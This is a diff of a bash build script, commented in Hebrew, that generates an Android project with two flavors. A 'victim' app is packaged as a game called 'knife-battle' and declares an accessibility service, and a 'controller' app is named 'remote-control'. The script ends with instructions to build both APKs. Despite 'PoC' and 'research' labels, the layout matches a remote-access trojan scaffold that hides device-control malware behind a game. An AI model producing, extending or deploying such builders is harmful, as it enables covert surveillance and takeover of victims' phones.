@@ -1,36 +1,47 @@
 #!/usr/bin/env bash
 
-set -e  # יעצור אם יש שגיאה
+set -e
 
-echo "=== התחלת יצירת פרויקט PoC ==="
+echo "=== התחלת יצירת פרויקט PoC מאפס ==="
 
-# שלב 1: הורד טמפלייט מינימלי רשמי של אנדרואיד
+# ניקוי קבצים קודמים אם קיימים
+rm -rf app gradle .gradle build gradlew gradlew.bat settings.gradle build.gradle gradle.properties || true
+
+# הורדת טמפלייט מינימלי אמין
 echo "מוריד טמפלייט מינימלי..."
-git clone --depth 1 https://github.com/android/gradle-recipes.git temp-template || { echo "שגיאה בהורדה"; exit 1; }
+git clone --depth 1 https://github.com/eliasdorneles/minimal-android-gradle-app.git temp-template || { echo "שגיאה בהורדה"; exit 1; }
 
 echo "מעתיק קבצים..."
-cp -r temp-template/templates/minimal-application/* . || { echo "שגיאה בהעתקה"; exit 1; }
+cp -r temp-template/* . || { echo "שגיאה בהעתקה"; exit 1; }
 rm -rf temp-template
 
-# שלב 2: התאמה של flavors + שמות APK
-echo "מעדכן build.gradle..."
-sed -i '/defaultConfig {/a \
-    flavorDimensions = ["type"]\
-    productFlavors {\
-        victim {\
-            dimension "type"\
-            applicationIdSuffix ".victim"\
-            archivesBaseName = "knife-battle"\
-        }\
-        controller {\
-            dimension "type"\
-            applicationIdSuffix ".controller"\
-            archivesBaseName = "remote-control"\
-        }\
-    }' app/build.gradle
+# יצירת gradle.properties עם AndroidX (חובה!)
+cat > gradle.properties << 'EOF'
+android.useAndroidX=true
+android.enableJetifier=true
+org.gradle.jvmargs=-Xmx2048m
+EOF
 
-# שלב 3: עדכון manifest עם שמות הקלאסים שלך
-echo "מעדכן AndroidManifest.xml..."
+# עדכון build.gradle ל-flavors + שמות APK
+echo "מעדכן build.gradle..."
+cat >> app/build.gradle << 'EOF'
+
+flavorDimensions = ["type"]
+productFlavors {
+    victim {
+        dimension "type"
+        applicationIdSuffix ".victim"
+        archivesBaseName = "knife-battle"
+    }
+    controller {
+        dimension "type"
+        applicationIdSuffix ".controller"
+        archivesBaseName = "remote-control"
+    }
+}
+EOF
+
+# manifest מלא
 cat > app/src/main/AndroidManifest.xml << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
@@ -39,7 +50,6 @@ cat > app/src/main/AndroidManifest.xml << 'EOF'
 
     <application android:allowBackup="false" android:label="PoC">
 
-        <!-- Victim - jhome.java -->
         <activity android:name=".jhome$LoadingActivity" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -58,7 +68,6 @@ cat > app/src/main/AndroidManifest.xml << 'EOF'
                 android:resource="@xml/accessibility_service" />
         </service>
 
-        <!-- Controller - manager.java -->
         <activity android:name=".manager" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -70,7 +79,7 @@ cat > app/src/main/AndroidManifest.xml << 'EOF'
 </manifest>
 EOF
 
-# שלב 4: יצירת accessibility_service.xml
+# accessibility_service.xml
 mkdir -p app/src/main/res/xml
 cat > app/src/main/res/xml/accessibility_service.xml << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
@@ -82,7 +91,7 @@ cat > app/src/main/res/xml/accessibility_service.xml << 'EOF'
     android:description="@string/accessibility_desc" />
 EOF
 
-# שלב 5: strings.xml
+# strings.xml
 cat > app/src/main/res/values/strings.xml << 'EOF'
 <resources>
     <string name="app_name">PoC</string>
@@ -90,7 +99,7 @@ cat > app/src/main/res/values/strings.xml << 'EOF'
 </resources>
 EOF
 
-# שלב 6: jhome.java - קוד Victim מלא (נשלט)
+# jhome.java (Victim)
 mkdir -p app/src/main/java/com/research/lab/victim
 cat > app/src/main/java/com/research/lab/victim/jhome.java << 'EOF'
 package com.research.lab.victim;
@@ -209,7 +218,7 @@ public class jhome {
 }
 EOF
 
-# manager.java - קוד Controller מלא (שולט)
+# manager.java (Controller)
 mkdir -p app/src/main/java/com/research/lab/controller
 cat > app/src/main/java/com/research/lab/controller/manager.java << 'EOF'
 package com.research.lab.controller;
@@ -286,13 +295,5 @@ public class manager extends Activity {
 }
 EOF
 
-# שלב סופי: עדכון gradle.properties ל-AndroidX
-cat > gradle.properties << 'END'
-android.useAndroidX=true
-android.enableJetifier=true
-org.gradle.jvmargs=-Xmx2048m
-END
-
-echo "=== הכל נוצר! ==="
-echo "עכשיו הרץ את ה-workflow ב-Actions כדי לבנות את ה-APKs"
-echo "ה-APKs יהיו: knife-battle-debug.apk ו-remote-control-debug.apk"
+echo "=== סיום יצירה! ==="
+echo "הפרויקט מוכן. הרץ ./gradlew assembleVictimDebug ו-./gradlew assembleControllerDebug"
